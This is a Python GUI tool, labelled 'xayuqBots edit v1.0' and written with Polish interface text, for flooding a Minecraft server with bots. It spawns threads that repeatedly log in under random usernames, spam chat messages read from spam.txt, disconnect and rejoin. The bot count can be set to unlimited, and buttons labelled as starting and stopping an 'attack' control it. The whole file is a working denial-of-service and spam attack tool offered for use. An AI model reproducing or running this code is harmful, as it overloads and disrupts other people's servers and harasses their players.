import socket,time,sys,random,os
from threading import Thread
from tkinter import *

handshake = '\x0f\x00\x04\t127.0.0.1\xde\x02'.encode("utf-8")
user = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 0, 2, 3, 4, 5, 6, 7, 8, 9, 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

def getRandomChar():
	return str(user[random.randint(0, len(user)-1)])

def getRandomUsername():
	username = ''
	for x in range(0,9):
		username = username + getRandomChar()
	return username 

def chat(msg):
	return (chr(len(msg)+2) + '\x01' + chr(len(msg)) + msg).encode('utf-8')

def connect(ip, port, username, indelay, joindelay):
	global running

	if not running:
		return;
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#s = socks.socksocket()
	#s.setproxy(socks.PROXY_TYPE_SOCKS5,"37.187.7.203")

	s.connect((ip, port))
	login = (chr(len(username)+2) + chr(0) + chr(len(username)) + username).encode("utf-8")
	s.sendall(handshake)
	s.sendall(login) 
	print("Bot "+username+" dolaczyl!")
	time.sleep(indelay/2)
	s.sendall(('\x02\x16' + chr(2)).encode('utf-8'))
	try:
		for x in spam:
			if(len(x)==0): continue
			s.sendall(chat(x))
	except socket.error:
		pass
	time.sleep(indelay/2)
	s.close()
	print("Bot "+username+" rozlaczyl!")
	time.sleep(joindelay)
	connect(ip, port, getRandomUsername(), indelay, joindelay)

if not os.path.exists('spam.txt'):
	print("spam.txt file not found, creating a new file, consider editing this file.")
	f = open("spam.txt","a")
	f.write("/register xayuqbot123 xayuqbot123\n/login xayuqbot123\nPwnage Begins...")
	f.close()
f = open("spam.txt", "r")
read = f.read(1024)
f.close()
print("Zaladowano spam.txt, dlugosc: "+str(len(read)))
spam = read.split('\n')
running = False

def pwn(ip, port, maxplayers, joindelay, indelay, spamdelay):
	global running
	count = 0
	while running:
		count+=1
		Thread(target=connect, args=(ip, port, getRandomUsername(), indelay, joindelay)).start()
		if(count>maxplayers and maxplayers!=0):
			break
		time.sleep(joindelay)

def error(error):
	lol = Tk()
	Label(lol, text=error).pack(side="top")
	Button(lol, text="Ok", command=lol.destroy).pack(side="bottom")

def start():
	global running

	if running:
		error("Atak jest juz właczony!")
		return;
	global status
	global ip
	ipAdd = ip.get()
	split = ipAdd.split(":")
	if len(ipAdd)==0:
		error("IP serwera jest puste wpisz ip!")
		return;
	status.set("Status: Aktywny")

	port = 25565
	if(len(split)==2):
		port = int(split[1])
		ipAdd = split[0]
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ipAdd, port))
		s.close()
	except socket.error:
		error("IP "+ipAdd+" i port "+str(port)+"")
		status.set("Status: Aktywny")
		return;
	status.set("Status: Aktywny")
	print("Startowanie...")
	running = True
	global join, stay,maxpl, spamdelay
	Thread(target=pwn, args=(ipAdd, port, maxpl.get(), join.get(), stay.get(), spamdelay.get())).start()

def stop():
	global useproxies
	print(useproxies.get())
	global running

	if not running:
		error("Atak nie jest włączony!")
		return;
	print("Zatrzymywanie ataku...")
	global status
	status.set("Status: Wylaczony")
	running = False

def quit():
	global running
	print("Zamykanie aplikacji...")
	if running:
		stop()
	global root
	root.destroy()

root = Tk()
root.geometry('200x400')
root.wm_title("xayuqBots edit v1.0")
root.protocol('WM_DELETE_WINDOW', quit)

frame = Frame(root)
frame.pack(side="bottom")

status = StringVar()
status.set("Status: Aktywny")
Label(frame, textvariable=status).pack(side="bottom")

Label(frame, text="IP:PORT").pack(side = "top")
ip = Entry(frame)
ip.pack(side="top")
Label(frame, text="Czas miedzy wejsciami").pack(side = "top")
join = Scale(frame, from_=0.2, to=15,  resolution=0.1, orient=HORIZONTAL)
join.pack()
Label(frame, text="Czas stania na spawnie").pack(side = "top")
stay = Scale(frame, from_=0.4, to=100,  resolution=0.1, orient=HORIZONTAL)
stay.pack()
Label(frame, text="Ilosc botow (0 = nieskonczonosc)").pack(side = "top")
maxpl = Scale(frame, from_=0, to=1000,  resolution=5, orient=HORIZONTAL)
maxpl.pack()
Label(frame, text="Czas miedzy wiadomosciami").pack(side = "top")
spamdelay = Scale(frame, from_=0, to=10,  resolution=0.1, orient=HORIZONTAL)
spamdelay.pack()

useproxies = IntVar()

Checkbutton(frame, text="Chce uzyc socks proxy", variable=useproxies, onvalue=1, offvalue=0).pack(side = "top")

Button(frame, text="Rozpoczynam atak", command=start).pack(side="left",padx = 5, pady = 5)
Button(frame, text="Stopuje atak", command=stop).pack(side="left",padx = 5, pady = 5)
Button(frame, text="Wylaczam", command=quit).pack(side="left",padx = 5, pady = 5)

root.mainloop()
